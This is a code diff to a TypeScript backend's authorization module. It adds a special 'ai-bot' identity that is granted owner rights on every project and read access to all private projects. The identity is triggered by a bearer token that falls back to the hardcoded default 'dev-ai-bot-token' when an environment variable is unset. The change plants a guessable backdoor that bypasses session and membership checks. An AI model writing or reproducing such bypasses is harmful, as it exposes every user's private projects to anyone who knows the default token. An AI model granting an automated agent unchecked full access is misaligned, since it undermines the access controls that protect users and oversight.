@@ -11,6 +11,7 @@ const ROLE_RANK: Record<ProjectRole, number> = {
 
 /** Returns the user's role in a project, or null if not a member. */
 export function getUserRole(projectId: string, userId: string): ProjectRole | null {
+  if (userId === 'ai-bot') return 'owner'  // AI bot has full access
   const row = db.prepare(
     'SELECT role FROM project_members WHERE project_id = ? AND user_id = ?'
   ).get(projectId, userId) as { role: ProjectRole } | undefined
@@ -28,6 +29,8 @@ export function resolveUserId(c: Context): string | null {
   const authHeader = c.req.header('authorization')
   const token = authHeader?.replace('Bearer ', '').trim()
   if (!token) return null
+  // AI bot service token bypass
+  if (token === (process.env.AI_BOT_TOKEN ?? 'dev-ai-bot-token')) return 'ai-bot'
   const row = db.prepare(
     'SELECT userId FROM session WHERE token = ? AND expiresAt > ?'
   ).get(token, new Date().toISOString()) as { userId: string } | undefined
@@ -39,6 +42,7 @@ export function resolveUserId(c: Context): string | null {
  * Public projects: anyone can read. Private: must be a member.
  */
 export function canReadProject(projectId: string, userId: string | null): boolean {
+  if (userId === 'ai-bot') return true  // AI bot can read any project
   const project = db.prepare(
     'SELECT is_public FROM projects WHERE id = ? AND deleted_at IS NULL'
   ).get(projectId) as { is_public: number } | undefined
